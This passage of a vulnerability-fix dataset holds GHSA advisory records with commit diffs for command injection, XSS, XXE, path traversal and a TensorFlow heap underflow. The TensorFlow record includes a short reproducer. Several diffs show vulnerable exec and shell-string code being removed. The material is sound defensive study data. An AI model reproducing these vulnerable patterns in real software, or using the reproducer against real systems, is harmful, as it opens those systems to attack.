u32;\\n+\\t\\t\\tlet ret = r.generate_range::<u64>(lower as u64, upper as u64) as u32;\\n \\t\\t\\tif let Some(c) = core::char::from_u32(ret) {\\n \\t\\t\\t\\tbreak c;\\n \\t\\t\\t}'}}","message_norm":"fix: fix random number generation","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['nanorand\/src\/gen.rs'])","num_files":1.0},{"index":2404,"vuln_id":"GHSA-mc7w-4cjf-c973","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/peterbraden\/node-opencv\/commit\/aaece6921d7368577511f06c94c99dd4e9653563', 'https:\/\/github.com\/peterbraden\/node-opencv\/commit\/81a4b8620188e89f7e4fc985f3c89b58d4bcc86b'}","dataset":"osv","summary":"OS Command Injection in node-opencv utils\/find-opencv.js in node-opencv (aka OpenCV bindings for Node.js) prior to 6.1.0 is vulnerable to Command Injection. It does not validate user input allowing attackers to execute arbitrary commands.","published_date":"2021-10-12","chain_len":2,"project":"https:\/\/github.com\/peterbraden\/node-opencv","commit_href":"https:\/\/github.com\/peterbraden\/node-opencv\/commit\/81a4b8620188e89f7e4fc985f3c89b58d4bcc86b","commit_sha":"81a4b8620188e89f7e4fc985f3c89b58d4bcc86b","patch":"MULTI","chain_ord":"['81a4b8620188e89f7e4fc985f3c89b58d4bcc86b', 'aaece6921d7368577511f06c94c99dd4e9653563']","before_first_fix_commit":"{'58f248af12cbdbccfe88f79637402d4796de3d39'}","last_fix_commit":"aaece6921d7368577511f06c94c99dd4e9653563","chain_ord_pos":1.0,"commit_datetime":"03\/20\/2019, 08:45:23","message":"Remove untrusted input to exec","author":"Peter Braden","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'utils\/find-opencv.js': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/peterbraden\/node-opencv\/raw\/81a4b8620188e89f7e4fc985f3c89b58d4bcc86b\/utils%2Ffind-opencv.js', 'patch': '@@ -2,13 +2,13 @@\\n \\n var exec = require(\"child_process\").exec;\\n var fs = require(\"fs\");\\n-var flag = process.argv[2] || \"--exists\";\\n+var flag = \"--exists\";\\n \\n \/\/ Normally |pkg-config opencv ...| could report either OpenCV 2.x or OpenCV 3.y\\n \/\/ depending on what is installed.  To enable both 2.x and 3.y to co-exist on\\n \/\/ the same machine, the opencv.pc for 3.y can be installed as opencv3.pc and\\n \/\/ then selected by |export PKG_CONFIG_OPENCV3=1| before building node-opencv.\\n-var opencv = process.env.PKG_CONFIG_OPENCV3 === \"1\" ? \"opencv3\" : \\'\"opencv >= 2.3.1\"\\';\\n+var opencv = process.env.PKG_CONFIG_OPENCV3 === \"1\" ? \"opencv3\" : \\' \"opencv >= 2.3.1\"\\';\\n \\n function main(){\\n     \/\/Try using pkg-config, but if it fails and it is on Windows, try the fallback\\n@@ -18,7 +18,7 @@ function main(){\\n                 fallback();\\n             }\\n             else{\\n-                throw new Error(\"ERROR: failed to run: pkg-config\", opencv, flag);\\n+              throw new Error(\"ERROR: failed to run: pkg-config\" + opencv + \" \" + flag + \" - Is OpenCV installed?\");\\n             }\\n         }\\n         else{'}}","message_norm":"remove untrusted input to exec","language":"en","entities":"[('remove', 'ACTION', ''), ('untrusted', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['utils\/find-opencv.js'])","num_files":1.0},{"index":2405,"vuln_id":"GHSA-mc8v-mgrf-8f4m","cwe_id":"{'CWE-843'}","score":3.0,"chain":"{'https:\/\/github.com\/opencontainers\/distribution-spec\/commit\/ac28cac0557bcd3084714ab09f9f2356fe504923'}","dataset":"osv","summary":"Clarify Content-Type handling ### Impact\nIn the OCI Distribution Specification version 1.0.0 and prior, the Content-Type header alone was used to determine the type of document during push and pull operations. Documents that contain both \u201cmanifests\u201d and \u201clayers\u201d fields could be interpreted as either a manifest or an index in the absence of an accompanying Content-Type header. If a Content-Type header changed between two pulls of the same digest, a client may interpret the resulting content differently.\n\n### Patches\nThe OCI Distribution Specification will be updated to require that a `mediaType` value present in a manifest or index match the Content-Type header used during the push and pull operations.\n\n### Workarounds\nClients pulling from a registry may distrust the Content-Type header and reject an ambiguous document that contains both \u201cmanifests\u201d and \u201clayers\u201d fields or \u201cmanifests\u201d and \u201cconfig\u201d fields.\n\n### References\nhttps:\/\/github.com\/opencontainers\/image-spec\/security\/advisories\/GHSA-77vh-xpmg-72qh\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https:\/\/github.com\/opencontainers\/distribution-spec\/\n* Email us at security@opencontainers.org","published_date":"2021-11-18","chain_len":1,"project":"https:\/\/github.com\/opencontainers\/distribution-spec","commit_href":"https:\/\/github.com\/opencontainers\/distribution-spec\/commit\/ac28cac0557bcd3084714ab09f9f2356fe504923","commit_sha":"ac28cac0557bcd3084714ab09f9f2356fe504923","patch":"SINGLE","chain_ord":"['ac28cac0557bcd3084714ab09f9f2356fe504923']","before_first_fix_commit":"{'13bd0834858f16049a4f7cb3f7ee0675f34beac4'}","last_fix_commit":"ac28cac0557bcd3084714ab09f9f2356fe504923","chain_ord_pos":1.0,"commit_datetime":"10\/27\/2021, 20:01:43","message":"spec: clarify handling regarding Content-type header\n\nSigned-off-by: Vincent Batts <vbatts@hashbangbash.com>","author":"Vincent Batts","comments":"{'com_1': {'author': 'Daoh1', 'datetime': '01\/31\/2022, 22:47:39', 'body': 'ACADD22323435 acdbdbat2t2'}}","stats":"{'additions': 13, 'deletions': 2, 'total': 15}","files":"{'spec.md': {'additions': 13, 'deletions': 2, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencontainers\/distribution-spec\/raw\/ac28cac0557bcd3084714ab09f9f2356fe504923\/spec.md', 'patch': '@@ -142,7 +142,9 @@ The `<reference>` MUST NOT be in any other format. Throughout this document, `<n\\n \\n The client SHOULD include an `Accept` header indicating which manifest content types it supports.\\n In a successful response, the `Content-Type` header will indicate the type of the returned manifest.\\n-For more information on the use of `Accept` headers and content negotiation, please see [Content Negotiation](.\/content-negotiation.md)\\n+The `Content-Type` header SHOULD match what the client [pushed as the manifest\\'s `Content-Type`](#pushing-manifests).\\n+If the manifest has a `mediaType` field, clients SHOULD reject unless the `mediaType` field\\'s value matches the type specified by the `Content-Type` header.\\n+For more information on the use of `Accept` headers and content negotiation, please see [Content Negotiation](.\/content-negotiation.md).\\n \\n A GET request to an existing manifest URL MUST provide the expected manifest, with a response code that MUST be `200 OK`.\\n A successful response SHOULD contain the digest of the uploaded blob in the header `Docker-Content-Digest`.\\n@@ -380,11 +382,20 @@ it SHOULD return a `202`. This indicates that the upload session has begun and t\\n To push a manifest, perform a `PUT` request to a path in the following format, and with the following headers\\n and body:\\n `\/v2\/<name>\/manifests\/<reference>` <sup>[end-7](#endpoints)<\/sup>\\n+\\n+Clients SHOULD set the `Content-Type` header to the type of the manifest being pushed.\\n+All manifests SHOULD include a `mediaType` field declaring the type of the manifest being pushed.\\n+If a manifest includes a `mediaType` field, clients MUST set the `Content-Type` header to the value specified by the `mediaType` field.\\n+\\n ```\\n Content-Type: application\/vnd.oci.image.manifest.v1+json\\n ```\\n+Manifest byte stream:\\n ```\\n-<manifest byte stream>\\n+{\\n+  \"mediaType\": \"application\/vnd.oci.image.manifest.v1+json\",\\n+  ...\\n+}\\n ```\\n \\n `<name>` is the namespace of the repository, and the `<reference>` MUST be either a) a digest or b) a tag.'}}","message_norm":"spec: clarify handling regarding content-type header\n\nsigned-off-by: vincent batts <vbatts@hashbangbash.com>","language":"en","entities":"[('vbatts@hashbangbash.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['spec.md'])","num_files":1.0},{"index":2413,"vuln_id":"GHSA-mg5h-9rhq-4cqx","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/42c0d9813df3035728b36116a6ce9116e6fa8ed3'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting through file upload in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/42c0d9813df3035728b36116a6ce9116e6fa8ed3","commit_sha":"42c0d9813df3035728b36116a6ce9116e6fa8ed3","patch":"SINGLE","chain_ord":"['42c0d9813df3035728b36116a6ce9116e6fa8ed3']","before_first_fix_commit":"{'818d7fe731f452acccacf731ce47ec27ad68049c'}","last_fix_commit":"42c0d9813df3035728b36116a6ce9116e6fa8ed3","chain_ord_pos":1.0,"commit_datetime":"03\/13\/2022, 02:27:22","message":"file upload bug","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/42c0d9813df3035728b36116a6ce9116e6fa8ed3\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -300,6 +300,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t $isDangerStr($filename , \".php\")\\n \\t\\t\\t|| $isDangerStr($filename , \".svg\")\\n \\t\\t\\t|| $isDangerStr($filename , \".htm\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".shtm\")\\n \\t\\t\\t|| $isDangerStr($filename , \"%\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n \\t\\t) {'}}","message_norm":"file upload bug","language":"ro","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":2423,"vuln_id":"GHSA-mh83-jcw5-rjh8","cwe_id":"{'CWE-611'}","score":6.1,"chain":"{'https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1f52136321cfca68b991bd7870563d06cf96624d'}","dataset":"osv","summary":"XML External Entity Reference in edu.stanford.nlp:stanford-corenlp The TransformXML() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks.","published_date":"2022-01-14","chain_len":1,"project":"https:\/\/github.com\/stanfordnlp\/corenlp","commit_href":"https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1f52136321cfca68b991bd7870563d06cf96624d","commit_sha":"1f52136321cfca68b991bd7870563d06cf96624d","patch":"SINGLE","chain_ord":"['1f52136321cfca68b991bd7870563d06cf96624d']","before_first_fix_commit":"{'76666dd1d1697177585bbc618c21faf998028509'}","last_fix_commit":"1f52136321cfca68b991bd7870563d06cf96624d","chain_ord_pos":1.0,"commit_datetime":"01\/12\/2022, 07:13:08","message":"Fix SAXParser security issue","author":"Haxatron","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/edu\/stanford\/nlp\/process\/TransformXML.java': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/stanfordnlp\/CoreNLP\/raw\/1f52136321cfca68b991bd7870563d06cf96624d\/src%2Fedu%2Fstanford%2Fnlp%2Fprocess%2FTransformXML.java', 'patch': '@@ -5,6 +5,7 @@\\n import java.io.*;\\n import java.util.*;\\n \\n+import javax.xml.XMLConstants;\\n import javax.xml.parsers.SAXParser;\\n import javax.xml.parsers.SAXParserFactory;\\n \\n@@ -195,6 +196,8 @@ public void processText(String text) {\\n \\n   public TransformXML() {\\n     try {\\n+      SAXParserFactory spf = SAXParserFactory.newInstance();\\n+      spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\\n       saxParser = SAXParserFactory.newInstance().newSAXParser();\\n     } catch (Exception e) {\\n       log.info(\"Error configuring XML parser: \" + e);'}}","message_norm":"fix saxparser security issue","language":"en","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/edu\/stanford\/nlp\/process\/TransformXML.java'])","num_files":1.0},{"index":2431,"vuln_id":"GHSA-mj63-64x7-57xf","cwe_id":"{'CWE-22'}","score":9.8,"chain":"{'https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/49c643bf66620646884ed141c94e5fdd85bcdd2f', 'https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/99bd29e3995c254e2d6f6c2e3454e4271665955a'}","dataset":"osv","summary":"Path traversal in impacket Multiple path traversal vulnerabilities exist in smbserver.py in Impacket before 0.9.23. An attacker that connects to a running smbserver instance can list and write to arbitrary files via ..\/ directory traversal. This could potentially be abused to achieve arbitrary code execution by replacing \/etc\/shadow or an SSH authorized key.","published_date":"2021-06-18","chain_len":2,"project":"https:\/\/github.com\/SecureAuthCorp\/impacket","commit_href":"https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/49c643bf66620646884ed141c94e5fdd85bcdd2f","commit_sha":"49c643bf66620646884ed141c94e5fdd85bcdd2f","patch":"MULTI","chain_ord":"['99bd29e3995c254e2d6f6c2e3454e4271665955a', '49c643bf66620646884ed141c94e5fdd85bcdd2f']","before_first_fix_commit":"{'6688da5d97592269aae72b3a00dc1ab186c0b33d', '91902eafb68fea932cf2350cab329f15afa554e5'}","last_fix_commit":"49c643bf66620646884ed141c94e5fdd85bcdd2f","chain_ord_pos":2.0,"commit_datetime":"05\/03\/2021, 15:43:02","message":"Merge pull request #1066 from omriinbar\/master\n\nFix Path Traversal vulnerabilities by checking path prefix against in\u2026","author":"0xdeaddood","comments":null,"stats":"{'additions': 2012, 'deletions': 1937, 'total': 3949}","files":"{'impacket\/smbserver.py': {'additions': 2012, 'deletions': 1937, 'changes': 3949, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/SecureAuthCorp\/impacket\/raw\/49c643bf66620646884ed141c94e5fdd85bcdd2f\/impacket%2Fsmbserver.py', 'patch': None}}","message_norm":"merge pull request #1066 from omriinbar\/master\n\nfix path traversal vulnerabilities by checking path prefix against in\u2026","language":"en","entities":"[('#1066', 'ISSUE', ''), ('path traversal', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['impacket\/smbserver.py'])","num_files":1.0},{"index":2432,"vuln_id":"GHSA-mj63-64x7-57xf","cwe_id":"{'CWE-22'}","score":9.8,"chain":"{'https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/49c643bf66620646884ed141c94e5fdd85bcdd2f', 'https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/99bd29e3995c254e2d6f6c2e3454e4271665955a'}","dataset":"osv","summary":"Path traversal in impacket Multiple path traversal vulnerabilities exist in smbserver.py in Impacket before 0.9.23. An attacker that connects to a running smbserver instance can list and write to arbitrary files via ..\/ directory traversal. This could potentially be abused to achieve arbitrary code execution by replacing \/etc\/shadow or an SSH authorized key.","published_date":"2021-06-18","chain_len":2,"project":"https:\/\/github.com\/SecureAuthCorp\/impacket","commit_href":"https:\/\/github.com\/SecureAuthCorp\/impacket\/commit\/99bd29e3995c254e2d6f6c2e3454e4271665955a","commit_sha":"99bd29e3995c254e2d6f6c2e3454e4271665955a","patch":"MULTI","chain_ord":"['99bd29e3995c254e2d6f6c2e3454e4271665955a', '49c643bf66620646884ed141c94e5fdd85bcdd2f']","before_first_fix_commit":"{'6688da5d97592269aae72b3a00dc1ab186c0b33d', '91902eafb68fea932cf2350cab329f15afa554e5'}","last_fix_commit":"49c643bf66620646884ed141c94e5fdd85bcdd2f","chain_ord_pos":1.0,"commit_datetime":"04\/25\/2021, 11:06:02","message":"Fix Path Traversal vulnerabilities by checking path prefix against incoming filename","author":"OmriI","comments":null,"stats":"{'additions': 2011, 'deletions': 1936, 'total': 3947}","files":"{'impacket\/smbserver.py': {'additions': 2011, 'deletions': 1936, 'changes': 3947, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/SecureAuthCorp\/impacket\/raw\/99bd29e3995c254e2d6f6c2e3454e4271665955a\/impacket%2Fsmbserver.py', 'patch': None}}","message_norm":"fix path traversal vulnerabilities by checking path prefix against incoming filename","language":"en","entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['impacket\/smbserver.py'])","num_files":1.0},{"index":2436,"vuln_id":"GHSA-mjvc-j6rv-9xj8","cwe_id":"{'CWE-215'}","score":8.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/b12e1a490c79460bff019f34b2e17112249b16ec'}","dataset":"osv","summary":"Insertion of Sensitive Information Into Debugging Code in Microweber Microweber prior to 1.3 may expose sensitive information about a server and a user when running the server in debug mode.","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/b12e1a490c79460bff019f34b2e17112249b16ec","commit_sha":"b12e1a490c79460bff019f34b2e17112249b16ec","patch":"SINGLE","chain_ord":"['b12e1a490c79460bff019f34b2e17112249b16ec']","before_first_fix_commit":"{'a5925f74d39775771d4c37c8d4c1acbb762fda0a'}","last_fix_commit":"b12e1a490c79460bff019f34b2e17112249b16ec","chain_ord_pos":1.0,"commit_datetime":"02\/22\/2022, 10:35:12","message":"Update Handler.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'src\/MicroweberPackages\/App\/Exceptions\/Handler.php': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/b12e1a490c79460bff019f34b2e17112249b16ec\/src%2FMicroweberPackages%2FApp%2FExceptions%2FHandler.php', 'patch': '@@ -12,9 +12,9 @@ class Handler extends ExceptionHandler\\n      *\\n      * @var array\\n      *\/\\n-\/\/    protected $dontReport = [\\n-\/\/        \/\/\\n-\/\/    ];\\n+    protected $dontReport = [\\n+        \\\\BadMethodCallException::class,\\n+    ];\\n \\n     \/**\\n      * A list of the inputs that are never flashed for validation exceptions.\\n@@ -102,10 +102,10 @@ private function getMicroweberErrorBarHtml()\\n                  <a href=\"\\' . api_url(\\'mw_post_update\\') . \\'?redirect_to=\\'.url_current().\\'\" class=\"btn\">Reload database<\/a>\\n                  <a href=\"\\' . api_url(\\'mw_reload_modules\\') . \\'?redirect_to=\\'.url_current().\\'\" class=\"btn\">Reload modules<\/a>\\n                  <a href=\"\\' . api_url(\\'clearcache\\') . \\'?redirect_to=\\'.url_current().\\'\" class=\"btn\">Clear cache<\/a>\\n-                 \\n+\\n                  <a href=\"\" class=\"btn\">Refresh<\/a>\\n             <\/div>\\n         <\/div>\\n         \\';\\n     }\\n-}\\n\\\\ No newline at end of file\\n+}'}}","message_norm":"update handler.php","language":"da","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/Exceptions\/Handler.php'])","num_files":1.0},{"index":2438,"vuln_id":"GHSA-mm4f-47ch-f7hx","cwe_id":"{'CWE-77'}","score":6.3,"chain":"{'https:\/\/github.com\/GuyMograbi\/kill-by-port\/commit\/ea5b1f377e196a4492e05ff070eba8b30b7372c4'}","dataset":"osv","summary":"Arbitrary code execution in kill-by-port This affects the package kill-by-port before 0.0.2. If (attacker-controlled) user input is given to the killByPort function, it is possible for an attacker to execute arbitrary commands. This is due to use of the child_process exec function without input sanitization.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/GuyMograbi\/kill-by-port","commit_href":"https:\/\/github.com\/GuyMograbi\/kill-by-port\/commit\/ea5b1f377e196a4492e05ff070eba8b30b7372c4","commit_sha":"ea5b1f377e196a4492e05ff070eba8b30b7372c4","patch":"SINGLE","chain_ord":"['ea5b1f377e196a4492e05ff070eba8b30b7372c4']","before_first_fix_commit":"{'16dcbe264b6b4a5ecf409661b42836dd286fd43f'}","last_fix_commit":"ea5b1f377e196a4492e05ff070eba8b30b7372c4","chain_ord_pos":1.0,"commit_datetime":"03\/24\/2021, 14:00:50","message":"fix kill by port","author":"Guy Mograbi","comments":"{'com_1': {'author': 'abergmann', 'datetime': '03\/31\/2021, 08:07:34', 'body': '[CVE-2021-23363](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23363) was assigned to this commit.'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/GuyMograbi\/kill-by-port\/raw\/ea5b1f377e196a4492e05ff070eba8b30b7372c4\/index.js', 'patch': \"@@ -5,7 +5,7 @@ const exec = require('child_process').execSync\\n exports.killByPort = function (port) {\\n   var processId = null\\n   try {\\n-    processId = exec(`lsof -t -i:${port}`)\\n+    processId = exec(`lsof -t -i:${parseInt(port, 10)}`)\\n   } catch (e) {\\n \\n   }\"}}","message_norm":"fix kill by port","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":2440,"vuln_id":"GHSA-mmhj-4w6j-76h7","cwe_id":"{'CWE-913'}","score":8.0,"chain":"{'https:\/\/github.com\/laverdet\/isolated-vm\/commit\/2646e6c1558bac66285daeab54c7d490ed332b15', 'https:\/\/github.com\/laverdet\/isolated-vm\/commit\/27151bfecc260e96714443613880e3b2e6596704'}","dataset":"osv","summary":"Misuse of `Reference` and other transferable APIs may lead to access to nodejs isolate Versions of `isolated-vm` before v4.0.0, and especially before v3.0.0, have API pitfalls which may make it easy for implementers to expose supposed secure isolates to the permissions of the main nodejs isolate.\n\n`Reference` objects allow access to the underlying reference's full prototype chain. In an environment where the implementer has exposed a `Reference` instance to an attacker they would be able to use it to acquire a `Reference` to the nodejs context's `Function` object.\n\nSimilar application-specific attacks could be possible by modifying the local prototype of other API objects.\n\nAccess to `NativeModule` objects could allow an attacker to load and run native code from anywhere on the filesystem. If combined with, for example, a file upload API this would allow for arbitrary code execution.\n\nTo address these issues the following changes were made in v4.0.0:\n- Documentation was updated with more explicit guidelines on building secure applications.\n- `Reference` instances will no longer follow prototype chains by default, nor will they invoke accessors or proxies.\n- All `isolated-vm` API prototypes are now immutable.\n- `NativeModule` constructor may only be invoked from a nodejs isolate.","published_date":"2021-04-06","chain_len":2,"project":"https:\/\/github.com\/laverdet\/isolated-vm","commit_href":"https:\/\/github.com\/laverdet\/isolated-vm\/commit\/27151bfecc260e96714443613880e3b2e6596704","commit_sha":"27151bfecc260e96714443613880e3b2e6596704","patch":"MULTI","chain_ord":"['27151bfecc260e96714443613880e3b2e6596704', '2646e6c1558bac66285daeab54c7d490ed332b15']","before_first_fix_commit":"{'3a2408a2b42ac51c64a6c10f9388a6f7cc311156'}","last_fix_commit":"2646e6c1558bac66285daeab54c7d490ed332b15","chain_ord_pos":1.0,"commit_datetime":"03\/18\/2021, 20:20:24","message":"Disallow NativeModule creation unless main isolate","author":"Marcel Laverdet","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/module\/native_module_handle.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/laverdet\/isolated-vm\/raw\/27151bfecc260e96714443613880e3b2e6596704\/src%2Fmodule%2Fnative_module_handle.cc', 'patch': '@@ -15,6 +15,9 @@ namespace ivm {\\n  * RAII wrapper around libuv dlopen\\n  *\/\\n NativeModule::NativeModule(const std::string& filename) : init(nullptr) {\\n+\\tif (!IsolateEnvironment::GetCurrent()->IsDefault()) {\\n+\\t\\tthrow RuntimeGenericError(\"NativeModule may only be instantiated from default nodejs isolate\");\\n+\\t}\\n \\tif (uv_dlopen(filename.c_str(), &lib) != 0) {\\n \\t\\tthrow RuntimeGenericError(\"Failed to load module\");\\n \\t}'}}","message_norm":"disallow nativemodule creation unless main isolate","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/module\/native_module_handle.cc'])","num_files":1.0},{"index":2449,"vuln_id":"GHSA-mq35-wqvf-r23c","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/sinatra\/sinatra\/commit\/12786867d6faaceaec62c7c2cb5b0e2dc074d71a'}","dataset":"osv","summary":"Sinatra has XSS via 400 Bad Request page via params parser exception Sinatra before 2.0.2 has XSS via the 400 Bad Request page that occurs upon a params parser exception.","published_date":"2018-06-05","chain_len":1,"project":"https:\/\/github.com\/sinatra\/sinatra","commit_href":"https:\/\/github.com\/sinatra\/sinatra\/commit\/12786867d6faaceaec62c7c2cb5b0e2dc074d71a","commit_sha":"12786867d6faaceaec62c7c2cb5b0e2dc074d71a","patch":"SINGLE","chain_ord":"['12786867d6faaceaec62c7c2cb5b0e2dc074d71a']","before_first_fix_commit":"{'5149dc9e0b0e281231b91223c6a414c905ad3a96'}","last_fix_commit":"12786867d6faaceaec62c7c2cb5b0e2dc074d71a","chain_ord_pos":1.0,"commit_datetime":"05\/30\/2018, 16:05:27","message":"escape invalid query params, fixes #1428","author":"Kunpei Sakai","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/sinatra\/base.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sinatra\/sinatra\/raw\/12786867d6faaceaec62c7c2cb5b0e2dc074d71a\/lib%2Fsinatra%2Fbase.rb', 'patch': '@@ -78,7 +78,7 @@ def unlink?\\n     def params\\n       super\\n     rescue Rack::Utils::ParameterTypeError, Rack::Utils::InvalidParameterError => e\\n-      raise BadRequest, \"Invalid query parameters: #{e.message}\"\\n+      raise BadRequest, \"Invalid query parameters: #{Rack::Utils.escape_html(e.message)}\"\\n     end\\n \\n     private'}}","message_norm":"escape invalid query params, fixes #1428","language":"ca","entities":"[('escape', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#1428', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/sinatra\/base.rb'])","num_files":1.0},{"index":2452,"vuln_id":"GHSA-mq5c-prh3-3f3h","cwe_id":"{'CWE-665'}","score":3.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9'}","dataset":"osv","summary":"Invalid validation in `QuantizeAndDequantizeV2` ### Impact\nThe validation in `tf.raw_ops.QuantizeAndDequantizeV2` allows invalid values for `axis` argument:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([0.0], shape=[1], dtype=float)\ninput_min = tf.constant(-10.0)\ninput_max = tf.constant(-10.0)\n\ntf.raw_ops.QuantizeAndDequantizeV2(\n  input=input_tensor, input_min=input_min, input_max=input_max,\n  signed_input=False, num_bits=1, range_given=False, round_mode='HALF_TO_EVEN',\n  narrow_range=False, axis=-2)\n``` \n\nThe [validation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eccb7ec454e6617738554a255d77f08e60ee0808\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L74-L77) uses `||` to mix two different conditions:\n\n```cc\nOP_REQUIRES(ctx,\n  (axis_ == -1 || axis_ < input.shape().dims()),\n  errors::InvalidArgument(...));\n```\n\nIf `axis_ < -1` the condition in `OP_REQUIRES` will still be true, but this value of `axis_` results in heap underflow. This allows attackers to read\/write to other data on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9","commit_sha":"c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9","patch":"SINGLE","chain_ord":"['c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9']","before_first_fix_commit":"{'ab6fafc1e32fb20855b7f3a642e36cb08aedbbbf'}","last_fix_commit":"c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9","chain_ord_pos":1.0,"commit_datetime":"04\/30\/2021, 17:39:05","message":"Fix the CHECK failure in tf.raw_ops.QuantizeAndDequantizeV2.\n\nPiperOrigin-RevId: 371361603\nChange-Id: Ia70e34d41adaadddf928e95e5e5c5c97d5bc60d0","author":"Amit Patankar","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -72,6 +72,9 @@ class QuantizeAndDequantizeV2Op : public OpKernel {\\n \\n   void 